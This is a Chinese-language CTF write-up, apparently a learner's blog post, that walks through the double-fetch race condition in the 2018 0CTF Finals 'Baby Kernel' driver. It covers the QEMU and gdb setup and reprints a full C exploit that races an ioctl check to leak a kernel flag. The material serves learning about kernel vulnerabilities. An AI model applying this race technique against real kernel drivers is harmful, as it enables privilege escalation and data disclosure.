---
layout:     post
title:      kernel pwn入门之路（更新中）
subtitle:   入门kernelpwn的例题
date:       2020-10-22
author:     X1ng
header-img: kernel.jpg
catalog: true
tags:
    - kernel pwn
    - wp

---

根据[钞sir师傅的博客](https://blog.csdn.net/qq_40827990/article/details/97036109)入门内核pwn的笔记

搭建好环境后复现例题

## gdb调试的栗子

1. 在当前目录下配置.gdbinit文件，设置

    ```shell
    vim .gdbinit
    ```

    在里面写上

    ```
    set architecture i386:x86-64
    ```

2. start.sh

    ```shell
    qemu-system-x86_64 \
    -m 256M -smp 2,cores=2,threads=1  \
    -kernel ./vmlinuz-4.15.0-22-generic \
    -initrd  ./rootfs.img \
    -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet" \
    -cpu qemu64 -netdev user,id=t0, \
    -device e1000,netdev=t0,id=nic0 \
    -nographic \
    -gdb tcp::1234
    ```

    查看驱动的地址

    ```
    / # lsmod
    baby 16384 0 - Live 0xffffffffc031d000 (OE)
    ```

3. 打开gdb

    ```
    gdb
    add-symbol-file ./baby.ko 0xffffffffc031d000 #附加驱动，让gdb对命令的反应速度快点
    target remote :1234
    ```

    （但是我在add-symbol-file之后gdb的反应速度依然慢）

> 关于驱动在内核态的调试方法应该是安装驱动，对相应函数下断,运行poc,然后才可以断下来调试,和我们在用户态直接调试程序其实就是多了一个运行poc,其他方法都差不多的…



## 2018 0CTF Finals Baby Kernel

### Double Fetch漏洞原理

Double Fetch漏洞属于条件竞争漏洞，一个用户态线程准备的数据通过系统调用进入内核，进入内核的时候进行安全检查（比如缓冲区大小、指针可用性等），当检查通过后进行实际处理之前，另一个用户态线程可以创造条件竞争，对那个已经将通过了检查的用户态数据进行篡改，使得数据在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升

### 程序逻辑分析

ida打开驱动程序baby.ko

![](https://tva1.sinaimg.cn/large/0081Kckwly1gjz181zxl5j31db0u0tjs.jpg)

可以看到if语句的两个分支，第一个分支可以输出flag的地址，第二个分支有两个检查，检查通过则与内存中flag逐字节对比，全部一致则输出flag

双击flag可以直接在内存中看到flag，，但是复现的主要目的是学习Double Fetch漏洞，所以需要绕过检查来让程序打印出flag

![](https://tva1.sinaimg.cn/large/0081Kckwly1gjy5t0fkdoj31na04wwfa.jpg)

检查函数如下

![](https://tva1.sinaimg.cn/large/0081Kckwly1gjy5tdu7tyj31db0u045w.jpg)

函数逻辑是判断a1+a2是否小于a3，小于a3返回0，通过检查

通过`*(_QWORD *)v5`和`*(_DWORD *)(v5 + 8) == strlen(flag)`我们很容易推出v5这个结构体包含的是一个flag的地址及其长度，为了与内核中的flag区分，这里记为flag1

```c
struct v5{
    char *flag1;
    size_t len;
};
```

用gdb调试发现，作为__chk_range_not_ok函数的第三个参数的是`0x7ffffffff000`

![](https://tva1.sinaimg.cn/large/0081Kckwly1gjz0xghsr3j31eq06g74v.jpg)

可以推测该函数用来判断前面两个参数的数据指针是否为用户态数据（因为如果可以是内核态数据的话，就可以让`v5->flag1 = flag`，直接通过后面的比较操作，从而打印出flag）

### 漏洞分析

漏洞在于 对v5的地址是否在内核中的检查 和 让flag1和flag逐字节比较 两个操作不是一个原子操作，也就是说可以在 对v5地址是否在内核中的检查 之后，在 让flag1和flag逐字节比较 之前将`v5->flag1`中的地址改成内核中的flag的地址，通过验证

所以思路就是先利用驱动提供的0x6666分支，获取内核中flag的加载地址（这个地址可以通过dmesg命令查看）；然后构造一个符合0x1337分支的数据结构，其中len可以从ida中`.data`上直接数出来为33，此时的`v5->flag1`指向一个用户空间地址；再调用`pthread_create`创建一个恶意线程,不断的将flag1所指向的用户态地址修改为内核中的flag地址以制造竞争条件,从而使其通过驱动中的逐字节比较检查,输出flag内容

---

```c
int pthread_create(pthread_t *tidp, const pthread_attr_t *attr, void *(*start_rtn)(void *), void *arg);
```

第一个参数为指向线程[标识符](https://baike.baidu.com/item/标识符)的[指针](https://baike.baidu.com/item/指针)。

第二个参数用来设置线程属性。

第三个参数是线程运行函数的起始地址。

最后一个参数是运行函数的参数。

栗子：

```c
#include <pthread.h>

void change_flag_addr(void *a){
    struct v5 *s = a;
    while(finish == 1){
        s->flag = flag_addr;
    }
}

int main()
{
	struct v5 t;
	pthread_t t1;
	pthread_create(&t1,NULL,change_flag_addr,&t); 
}

```



---

贴一下钞sir师傅的poc：

```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <pthread.h>

unsigned long long flag_addr;
int Time = 1000;
int finish = 1;

struct v5{
    char *flag;
    size_t len;
};

//change the user_flag_addr to the kernel_flag_addr
void change_flag_addr(void *a){
    struct v5 *s = a;
    while(finish == 1){
        s->flag = flag_addr;
    }
}

int main()
{
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
    pthread_t t1;
    char buf[201]={0};
    char m[] = "flag{AAAA_BBBB_CC_DDDD_EEEE_FFFF}";     //user_flag
    char *addr;
    int file_addr,fd,ret,id,i;
    struct v5 t;
    t.flag = m;
    t.len = 33;
    fd = open("/dev/baby",0);
    ret = ioctl(fd,0x6666);
    system("dmesg | grep flag > /tmp/sir.txt");     //get kernel_flag_addr
    file_addr = open("/tmp/sir.txt",O_RDONLY);
    id = read(file_addr,buf,200);
    close(file_addr);
    addr = strstr(buf,"Your flag is at ");
    if(addr)
        {
            addr +=16;
            flag_addr = strtoull(addr,addr+16,16);
            printf("[*]The flag_addr is at: %p\n",flag_addr);
        }
    else
    {
            printf("[*]Didn't find the flag_addr!\n");
            return 0;
    }
    pthread_create(&t1,NULL,change_flag_addr,&t);   //Malicious thread
    for(i=0;i<Time;i++){
        ret = ioctl(fd,0x1337,&t);
        t.flag = m;     //In order to pass the first inspection
    }
    finish = 0;
    pthread_join(t1,NULL);
    close(fd);
    printf("[*]The result:\n");
    system("dmesg | grep flag");
    return 0;
}
```

PS:

>1. 配置QEMU启动参数时,不要开启SMAP保护，否则在内核中直接访问用户态数据会引起kernel panic…
>
>2. 配置QEMU启动参数时，需要配置为非单核单线程启动，不然无法触发poc中的竞争条件,具体操作是在启动参数中增加其内核数选项，如:
>
>    ```shell
>    -smp 2,cores=2,threads=1  \
>    ```

